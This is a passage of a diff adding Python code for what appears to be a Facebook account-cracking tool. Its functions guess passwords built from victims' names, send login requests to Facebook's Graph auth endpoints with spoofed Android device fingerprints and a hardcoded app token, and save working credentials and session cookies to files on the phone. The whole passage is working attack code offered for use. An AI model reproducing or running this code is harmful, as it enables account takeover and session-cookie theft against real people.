+                sys.stdout.write(f'\r\r\x1b[38;5;244m(\x1b[38;5;46m{date}\x1b[38;5;244m)\x1b[38;5;46m %s \x1b[38;5;244m|\x1b[38;5;46m OK\x1b[38;5;244m|\x1b[38;5;46mCP\x1b[38;5;46m %s\x1b[38;5;244m|\x1b[38;5;46m%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+                fn = names.split(' ')[0]
+                try:
+                        ln = names.split(' ')[1]
+                except:
+                        ln = fn
+                for pw in passlist:
+                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
+                        fbbv = str(random.randint(111111111,999999999))
+                        android_version = device['android_version']
+                        model = device['model']
+                        build = device['build']
+                        fblc = device['fblc']
+                        fbcr = sim_id
+                        fbmf = device['fbmf']
+                        fbbd = device['fbbd']
+                        fbdv = device['fbdv']
+                        fbsv = device['fbsv']
+                        fbca = device['fbca']
+                        fbdm = device['fbdm']
+                        fbfw = '1'
+                        fbrv = '0'
+                        fban = 'FB4A'
+                        fbpn = 'com.facebook.katana'
+                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957647;FBDM/{density=2.0,width=720,height=1600};FBLC/ru_RU;FBRV/334763932;FBCR/MTS RUS;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo V2135;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
+                        random_seed = random.Random()
+                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
+                        device_id = str(uuid.uuid4())
+                        secure = str(uuid.uuid4())
+                        family = str(uuid.uuid4())
+                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
+                        sim_serials = f'["{xd}"]'
+                        li = ['28','29','210']
+                        li2 = random.choice(li)
+                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
+                        jazoest = li2+j1
+                        data = {
+                                'adid':adid,
+                                'format':'json',
+                                'device_id':device_id,
+                                'email':ids,
+                                'password':pas,
+                                "session_id": str(uuid.uuid4()),
+                                "advertiser_id": str(uuid.uuid4()),
+                                "reg_instance": str(uuid.uuid4()),
+                                "logged_out_id": str(uuid.uuid4()),
+                                "hash_id": str(uuid.uuid4()),
+                                "sim_country": "id",
+                                "network_country": "id",
+                                "enroll_misauth": "false",
+                                'generate_analytics_claims':'1',
+                                'credentials_type':'password',
+                                'source':'login',
+                                'error_detail_type':'button_with_disabled',
+                                'enroll_misauth':'false',
+                                "cpl": "true",
+                                'generate_session_cookies':'1',
+                                'generate_machine_id':'1',
+                                'meta_inf_fbmeta':'',
+                                'currently_logged_in_userid':'0',
+                                'fb_api_req_friendly_name':'authenticate',
+                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+                        }
+                        headers={
+                                'Authorization':f'OAuth {accessToken}',
+                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
+                                "X-FB-Net-HNI": str(random.randint(900000, 999999)),
+                                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
+                                'X-FB-Friendly-Name':'authenticate',
+                                'X-FB-Connection-Type':'unknown',
+                                'User-Agent': ua,
+                                'Accept-Encoding':'gzip, deflate',
+                                'Content-Type': 'application/x-www-form-urlencoded',
+                                'X-FB-HTTP-Engine': 'Liger'
+                                }
+                        url = 'https://b-graph.facebook.com/method/auth.login'
+                        po = requests.post(url,data=data,headers=headers).json()
+                        if 'session_key' in po:
+                                        print(f'\r\r\x1b[38;5;244m(\x1b[38;5;46mHOP-OK\x1b[38;5;244m)\x1b[38;5;46m '+ids+f' ━\x1b[38;5;244m➤\x1b[38;5;46m '+pas+'\033[1;97m')
+                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+                                        print(f"\r\r\x1b[38;5;244m=(\x1b[38;5;46m💥\x1b[38;5;244m)={A} "+coki)
+                                        linex()
+                                        open('/sdcard/HOP-FILE-M2-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
+                                        oks.append(ids)
+                                        break
+                        elif 'www.facebook.com' in po['error']['message']:
+                                        if 'y' in pcp:
+                                                print(f'\r\r\x1b[38;5;244m({Y}HOP-CP\x1b[38;5;244m){Y} '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/HOP-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                cps.append(ids)
+                                                break
+                                        else:
+                                                break
+                        else:
+                                        continue
+                loop+=1
+        except Exception as e:
+                pass
+#__________________| RANDOM METHOD M1 |__________________#
+def rndm1(uid,passlist):
+        global loop
+        global oks
+        sys.stdout.write(f'\r\r\x1b[38;5;244m(\x1b[38;5;46m{date}\x1b[38;5;244m)\x1b[38;5;46m %s \x1b[38;5;244m|\x1b[38;5;46m OK\x1b[38;5;244m|\x1b[38;5;46mCP\x1b[38;5;46m %s\x1b[38;5;244m|\x1b[38;5;46m%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+        try:
+                for pas in passlist:
+                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
+                        fbbv = str(random.randint(111111111,999999999))
+                        android_version = device['android_version']
+                        model = device['model']
+                        build = device['build']
+                        fblc = device['fblc']
+                        fbcr = sim_id
+                        fbmf = device['fbmf']
+                        fbbd = device['fbbd']
+                        fbdv = device['fbdv']
+                        fbsv = device['fbsv']
+                        fbca = device['fbca']
+                        fbdm = device['fbdm']
+                        fbfw = '1'
+                        fbrv = '0'
+                        fban = 'FB4A'
+                        fbpn = 'com.facebook.katana'
+                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
+                        random_seed = random.Random()
+                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
+                        device_id = str(uuid.uuid4())
+                        secure = str(uuid.uuid4())
+                        family = str(uuid.uuid4())
+                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
+                        sim_serials = f'["{xd}"]'
+                        li = ['28','29','210']
+                        li2 = random.choice(li)
+                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
+                        jazoest = li2+j1
+                        data = {
+                                'adid':adid,
+                                'format':'json',
+                                'device_id':device_id,
+                                'email':uid,
+                                'password':pas,
+                                "logged_out_id": str(uuid.uuid4()),
+                                "hash_id": str(uuid.uuid4()),
+                                "reg_instance": str(uuid.uuid4()),
+                                "session_id": str(uuid.uuid4()),
+                                "advertiser_id": str(uuid.uuid4()),
+                                'generate_analytics_claims':'1',
+                                'credentials_type':'password',
+                                'source':'login',
+                                "sim_country": "id",
+                                "network_country": "id",
+                                "relative_url": "method/auth.login",
+                                'error_detail_type':'button_with_disabled',
+                                'enroll_misauth':'false',
+                                'generate_session_cookies':'1',
+                                'generate_machine_id':'1',
+                                'fb_api_req_friendly_name':'authenticate',
+                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+                        }
+                        headers={
+                                'Authorization':f'OAuth {accessToken}',
+                                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
+                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
+                                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
+                                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
+                                'X-FB-Friendly-Name':'authenticate',
+                                'X-FB-Connection-Type':'unknown',
+                                'User-Agent': HOP_M3(),
+                                'Accept-Encoding':'gzip, deflate',
+                                'Content-Type': 'application/x-www-form-urlencoded',
+                                'X-FB-HTTP-Engine': 'Liger'
+                                }
+                        url = 'https://graph.facebook.com/auth/login'
+                        po = requests.post(url,data=data,headers=headers).json()
+                        if 'session_key' in po:
+                                        print(f'\r\r\x1b[38;5;244m(\x1b[38;5;46mHOP-OK\x1b[38;5;244m)\x1b[38;5;46m '+uid+f' ━\x1b[38;5;244m➤\x1b[38;5;46m '+pas+'\033[1;97m')
+                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+                                        print(f"\r\r\x1b[38;5;244m(\x1b[38;5;46mCOOKIE\x1b[38;5;244m)>{A} "+coki)
+                                        open('/sdcard/HOP-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
+                                        oks.append(uid)
+                                        break
+                        elif 'www.facebook.com' in po['error']['message']:
+                                        if 'y' in pcp:
+                                                print(f'\r\r\x1b[38;5;244m({Y}HOP-CP\x1b[38;5;244m){Y} '+uid+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/HOP-CP.txt','a').write(uid+'|'+pas+'\n')
+                                                cps.append(uid)
+                                                break
+                                        else:
+                                                break
+                        else:
+                                        continue
+                loop+=1
+        except Exception as e:
+                pass
+#__________________| RANDOM METHOD M2 |__________________#
+def rndm2(uid,passlist):
+        global loop
+        global oks
+        sys.stdout.write(f'\r\r\x1b[38;5;244m(\x1b[38;5;46m{date}\x1b[38;5;244m)\x1b[38;5;46m %s \x1b[38;5;244m|\x1b[38;5;46m OK\x1b[38;5;244m|\x1b[38;5;46mCP\x1b[38;5;46m %s\x1b[38;5;244m|\x1b[38;5;46m%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+        try:
+                for pas in passlist:
+                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
+                        fbbv = str(random.randint(111111111,999999999))
+                        android_version = device['android_version']
+                        model = device['model']
+                        build = device['build']
+                        fblc = device['fblc']
+                        fbcr = sim_id
+                        fbmf = device['fbmf']
+                        fbbd = device['fbbd']
+                        fbdv = device['fbdv']
+                        fbsv = device['fbsv']
+                        fbca = device['fbca']
+                        fbdm = device['fbdm']
+                        fbfw = '1'
+                        fbrv = '0'
+                        fban = 'FB4A'
+                        fbpn = 'com.facebook.katana'
+                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
+                        random_seed = random.Random()
+                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
+                        device_id = str(uuid.uuid4())
+                        secure = str(uuid.uuid4())
+                        family = str(uuid.uuid4())
+                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
+                        sim_serials = f'["{xd}"]'
+                        li = ['28','29','210']
+                        li2 = random.choice(li)
+                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
+                        jazoest = li2+j1
+                        data = {
+                                'adid':adid,
+                                'format':'json',
+                                'device_id':device_id,
+                                'email':uid,
+                                'password':pas,
+                                "logged_out_id": str(uuid.uuid4()),
+                                "hash_id": str(uuid.uuid4()),
+                                "reg_instance": str(uuid.uuid4()),
+                                "session_id": str(uuid.uuid4()),
+                                "advertiser_id": str(uuid.uuid4()),
+                                'generate_analytics_claims':'1',
+                                'credentials_type':'password',
+                                'source':'login',
+                                "sim_country": "id",
+                                "network_country": "id",
+                                "relative_url": "method/auth.login",
+                                'error_detail_type':'button_with_disabled',
+                                'enroll_misauth':'false',
+                                'generate_session_cookies':'1',
+                                'generate_machine_id':'1',
+                                'fb_api_req_friendly_name':'authenticate',
+                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+                        }
+                        headers={
+                                'Authorization':f'OAuth {accessToken}',
+                                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
+                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
+                                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
+                                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
+                                'X-FB-Friendly-Name':'authenticate',
+                                'X-FB-Connection-Type':'unknown',
+                                'User-Agent': HOP_M3(),
+                                'Accept-Encoding':'gzip, deflate',
+                                'Content-Type': 'application/x-www-form-urlencoded',
+                                'X-FB-HTTP-Engine': 'Liger'
+                                }
+                        url = 'https://b-graph.facebook.com/auth/login'
+                        po = requests.post(url,data=data,headers=headers).json()
+                        if 'session_key' in po:
+                                        print(f'\r\r\x1b[38;5;244m(\x1b[38;5;46mHOP-OK\x1b[38;5;244m)\x1b[38;5;46m '+uid+f' ━\x1b[38;5;244m➤\x1b[38;5;46m '+pas+'\033[1;97m')
+                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+                                        print(f"\r\r\x1b[38;5;244m(\x1b[38;5;46mCOOKIE\x1b[38;5;244m)>{A} "+coki)
+                                        open('/sdcard/HOP-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
+                                        oks.append(uid)
+                                        break
+                        elif 'www.facebook.com' in po['error']['message']:
+                                        if 'y' in pcp:
+                                                print(f'\r\r\x1b[38;5;244m({Y}HOP-CP\x1b[38;5;244m){Y} '+uid+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/HOP-CP.txt','a').write(uid+'|'+pas+'\n')
+                                                cps.append(uid)
+                                                break
+                                        else:
+                                                break
+                        else:
+                                        continue
+                loop+=1
+        except Exception as e:
+                pass
+#__________________| END |__________________#
+try: 
+    menu()
+except requests.exceptions.ConnectionError:
+        print('\n No internet connection ...')
+        exit()
+except Exception as e:
+    print(e)
